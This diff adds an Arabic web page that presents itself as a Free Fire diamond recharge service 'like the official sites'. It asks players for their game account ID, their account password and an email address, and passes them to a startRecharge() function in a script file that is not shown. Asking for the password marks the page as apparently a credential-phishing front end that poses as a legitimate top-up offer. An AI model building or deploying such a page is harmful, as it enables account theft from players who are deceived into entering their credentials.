@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>شحن جواهر فري فاير</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap');
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: white;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 0 20px #00e5ff;
+      margin-top: 40px;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    h2 {
+      color: #00e5ff;
+      margin-bottom: 10px;
+    }
+
+    p {
+      margin-bottom: 20px;
+      color: #ccc;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+    }
+
+    input, select {
+      background: #1e1e1e;
+      color: #fff;
+    }
+
+    button {
+      background-color: #00c853;
+      color: white;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #00e676;
+      transform: scale(1.03);
+    }
+
+    .message {
+      margin-top: 25px;
+      color: #0ff;
+      font-weight: bold;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px);}
+      to { opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>🚀 أهلاً بك عزيزي المستخدم!</h2>
+    <p>نوفر لك خدمة شحن جواهر فري فاير مثل المواقع الرسمية 🔐</p>
+
+    <input type="text" id="uid" placeholder="👤 أدخل ID الحساب" required>
+    <input type="password" id="password" placeholder="🔐 كلمة السر" required>
+    <input type="email" id="email" placeholder="📧 البريد الإلكتروني" required>
+
+    <label for="diamonds">💎 اختر عدد الجواهر:</label>
+    <select id="diamonds">
+      <option value="100">100 جوهرة</option>
+      <option value="50">50 جوهرة</option>
+      <option value="200">200 جوهرة</option>
+      <option value="300">300 جوهرة</option>
+      <option value="500">500 جوهرة</option>
+      <option value="1000">1000 جوهرة</option>
+      <option value="5600">5600 جوهرة</option>
+    </select>
+
+    <button onclick="startRecharge()">🚀 بدء شحن الآن</button>
+    <div class="message" id="statusMessage"></div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
